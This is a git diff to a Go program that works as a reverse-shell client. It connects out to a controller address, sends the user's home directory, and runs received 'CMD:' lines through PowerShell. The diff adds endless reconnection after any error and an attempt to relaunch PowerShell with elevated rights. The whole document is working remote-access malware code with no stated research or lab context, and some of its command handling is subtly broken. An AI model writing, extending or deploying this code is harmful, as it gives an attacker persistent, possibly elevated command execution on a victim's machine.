@@ -12,6 +12,7 @@ import (
 
 //globals
 var conn net.Conn
+var serverIP string
 var terminator = "__END__\n"
 var detectedOs string
 var myIP string
@@ -25,7 +26,7 @@ param err - the error to print out
  func handleErr(err error) {
 	if err != nil {
 		if(debug) { fmt.Println("Error! : ", err) }
-		os.Exit(1)
+		initListener(serverIP) // if we for ANY REASON lose connectivity, go back to trying to connect
 	}
  }
 
@@ -49,17 +50,21 @@ param err - the error to print out
 
 func initListener(serveraddr string) {
 	var err error
-	conn, err = net.Dial("tcp", serveraddr + ":25565")
+	conn, err = net.Dial("tcp", serveraddr)
+	for(err != nil) {
+		if (debug) { fmt.Println("RETRYING CONNECTION!") } 
+		conn, err = net.Dial("tcp", serveraddr)
+	}
 	myIP = conn.LocalAddr().String()
 	handleErr(err)
 
 	if(debug) { fmt.Println("Listener now from: ", conn.LocalAddr().String()) }
+	listen()	
 }
 
 func listen() {
 	userdir, err := os.UserHomeDir()
 	handleErr(err)
-	// fmt.Println(userdir)
 	conn.Write([]byte(userdir))
 	scan()
 }
@@ -71,15 +76,15 @@ func scan() {
 		cmd = scanner.Text()
 		if(strings.Contains(cmd, "CMD:")) {
 			cmd = cmd[5:]
+			cmd = strings.Trim(cmd, " \"")
 			if(debug) { fmt.Println("Running command: " + cmd) }
 			RunLogged(cmd)
 		}
-
-		
 	}
 
 	if err := scanner.Err(); err != nil {
 		handleErr(err)
+
 	}
 }
 
@@ -93,7 +98,7 @@ func RunLogged(cmd string) {
 		if(strings.Contains(cmd, "cd")) {
 			currentDir = cmd[3:]
 			if(debug) { fmt.Println("currentdir: " + currentDir) }
-			out = exec.Command("powershell.exe",cmd)
+			out = exec.Command("powershell.exe","-NoProfile", "-NonInteractive", "-Command", "Start-Process powershell -Verb RunAs && " + cmd)
 		} else {
 			out = exec.Command("powershell.exe","cd " + currentDir + "; " + cmd)
 		}
@@ -109,15 +114,16 @@ func RunLogged(cmd string) {
 	
 }
  
- func main() {
+func main() {
+
+	if (len(os.Args) == 1) {
+		serverIP = "127.0.0.1:55565"
+	} else {
+		serverIP = os.Args[1]
+	}
+
 	if (debug) { fmt.Println("Initializing Client...") } 
 	detectOs()
-	initListener("127.0.0.1")
-	listen()	
+	initListener(serverIP)
 	
  }
-
-
-
-
-
